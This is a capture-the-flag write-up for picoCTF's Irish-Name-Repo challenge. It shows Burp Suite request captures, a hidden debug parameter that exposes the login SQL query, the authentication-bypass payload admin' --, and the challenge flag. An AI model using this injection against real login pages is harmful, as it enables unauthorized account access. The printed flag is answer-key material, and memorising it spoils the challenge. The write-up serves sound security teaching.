# Irish-Name-Repo

### Description:

Do you think you can log us in? Try to see if you can login!
Additional details will be available after launching your challenge instance.
`Click "Launch Instance".`
Do you think you can log us in? Try to see if you can login!
http://fickle-tempest.picoctf.net:52402.

### Commands / Steps:

```bash
# Step 1: Go to the website. No obvious clues were found in the dev tools.

# Step 2: There's a login page for admin. So let's try logging in with username=admin and password=admin. And it shows login failed.

# Step 3: Let's try that again with burpsuite and intercept the request. 
POST /login.php HTTP/1.1
Host: fickle-tempest.picoctf.net:52402
Content-Length: 40
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://fickle-tempest.picoctf.net:52402
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://fickle-tempest.picoctf.net:52402/login.html
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=admin&password=anything&debug=0

# Step 4: There's debug mode in the request body, so let's set the debug=1 and send the request. Then we get the login failed page but with the sql information in the top.
username: admin
password: anything
SQL query: SELECT * FROM users WHERE name='admin' AND password='anything'

# Step 5: The first thing we can try is checking if it's prone to sql injection. We will change the request body like this in burpsuite and forward the request. 
username=admin' --&password=password&debug=1       


'   #The single ' here is just to close the one above to comment out the below lines. NOT relating to the request body.
# Step 6: This reveals the flag.
username: admin' --
password: password
SQL query: SELECT * FROM users WHERE name='admin' --' AND password='password'

Logged in!

Your flag is: picoCTF{s0m3_SQL_85832275}
```

### Flag:

> picoCTF{s0m3_SQL_85832275}

### Notes / Tips

- Debug Parameter: Hidden `debug=1` parameter reveals backend SQL queries, aiding vulnerability discovery
- Injection Payload: `admin' --` works by:
    - `'` closes the username string literal
    - `--` comments out the remaining query (including password check)
- Result: SELECT * FROM users WHERE name='admin' (no password verification because the rest is commented out)




